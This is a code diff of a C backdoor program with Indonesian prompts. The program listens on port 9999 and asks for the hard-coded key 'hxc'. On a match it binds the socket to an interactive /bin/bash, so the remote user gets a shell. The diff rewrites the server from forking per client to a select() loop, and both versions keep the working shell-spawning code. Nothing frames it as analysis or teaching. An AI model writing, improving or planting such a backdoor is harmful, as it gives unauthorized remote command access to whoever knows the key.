@@ -4,35 +4,23 @@
 #include <unistd.h>
 #include <arpa/inet.h>
 #include <sys/socket.h>
-#include <sys/types.h>
-#include <netinet/in.h>
+#include <sys/select.h>
 
 #define PORT 9999
 #define SECRET "hxc"
+#define MAX_CLIENTS 10
 
-void handle_client(int client_sock) {
-    char buffer[1024];
-    write(client_sock, "Masukkan key: ", 23);
-    
-    int len = read(client_sock, buffer, sizeof(buffer) - 1);
-    buffer[len] = '\0';
-
-    if (strncmp(buffer, SECRET, strlen(SECRET)) == 0) {
-        write(client_sock, "Akses diterima. Masuk shell...\n", 32);
-        dup2(client_sock, 0);
-        dup2(client_sock, 1);
-        dup2(client_sock, 2);
-        execl("/bin/bash", "bash", "-i", NULL);
-    } else {
-        write(client_sock, "Key salah. Bye.\n", 16);
-        close(client_sock);
-    }
+void trim_newline(char *str) {
+    char *p = strchr(str, '\n');
+    if (p) *p = '\0';
 }
 
 int main() {
     int sockfd, client_sock;
     struct sockaddr_in server, client;
     socklen_t client_len = sizeof(client);
+    fd_set read_fds, master_fds;
+    int max_fd, client_fds[MAX_CLIENTS] = {0};
 
     sockfd = socket(AF_INET, SOCK_STREAM, 0);
     if (sockfd < 0) {
@@ -52,23 +40,77 @@ int main() {
         exit(1);
     }
 
-    listen(sockfd, 5);
+    if (listen(sockfd, 5) < 0) {
+        perror("Listen error");
+        exit(1);
+    }
+
     printf("[*] Listening on port %d...\n", PORT);
 
+    FD_ZERO(&master_fds);
+    FD_SET(sockfd, &master_fds);
+    max_fd = sockfd;
+
     while (1) {
-        client_sock = accept(sockfd, (struct sockaddr *)&client, &client_len);
-        if (client_sock < 0) {
-            perror("Accept error");
+        read_fds = master_fds;
+        if (select(max_fd + 1, &read_fds, NULL, NULL, NULL) < 0) {
+            perror("Select error");
             continue;
         }
 
-        if (!fork()) {
-            close(sockfd);
-            handle_client(client_sock);
-            exit(0);
+        for (int i = 0; i <= max_fd; i++) {
+            if (!FD_ISSET(i, &read_fds)) continue;
+
+            if (i == sockfd) {
+                client_sock = accept(sockfd, (struct sockaddr *)&client, &client_len);
+                if (client_sock < 0) {
+                    perror("Accept error");
+                    continue;
+                }
+                for (int j = 0; j < MAX_CLIENTS; j++) {
+                    if (client_fds[j] == 0) {
+                        client_fds[j] = client_sock;
+                        FD_SET(client_sock, &master_fds);
+                        if (client_sock > max_fd) max_fd = client_sock;
+                        write(client_sock, "Masukkan key: ", strlen("Masukkan key: "));
+                        break;
+                    }
+                }
+            } else {
+                char buffer[1024];
+                int len = read(i, buffer, sizeof(buffer) - 1);
+                if (len <= 0) {
+                    close(i);
+                    FD_CLR(i, &master_fds);
+                    for (int j = 0; j < MAX_CLIENTS; j++) {
+                        if (client_fds[j] == i) client_fds[j] = 0;
+                    }
+                    continue;
+                }
+
+                buffer[len] = '\0';
+                trim_newline(buffer);
+
+                if (strncmp(buffer, SECRET, strlen(SECRET)) == 0) {
+                    write(i, "Akses diterima. Masuk shell...\n", 32);
+                    dup2(i, 0);
+                    dup2(i, 1);
+                    dup2(i, 2);
+                    execl("/bin/bash", "bash", "-i", NULL);
+                    perror("execl failed");
+                    exit(1);
+                } else {
+                    write(i, "Key salah. Bye.\n", 16);
+                    close(i);
+                    FD_CLR(i, &master_fds);
+                    for (int j = 0; j < MAX_CLIENTS; j++) {
+                        if (client_fds[j] == i) client_fds[j] = 0;
+                    }
+                }
+            }
         }
-        close(client_sock);
     }
 
+    close(sockfd);
     return 0;
 }
